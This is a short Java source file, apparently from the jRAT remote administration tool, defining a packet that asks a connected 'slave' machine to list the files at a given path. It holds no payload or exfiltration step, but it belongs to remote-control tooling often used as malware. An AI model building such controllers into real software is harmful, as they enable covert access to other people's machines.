package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class Packet15ListFiles implements OutgoingPacket {

	private String path;

	public Packet15ListFiles(String path) {
		this.path = path;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(path);
	}

	@Override
	public short getPacketId() {
		return 15;
	}

}
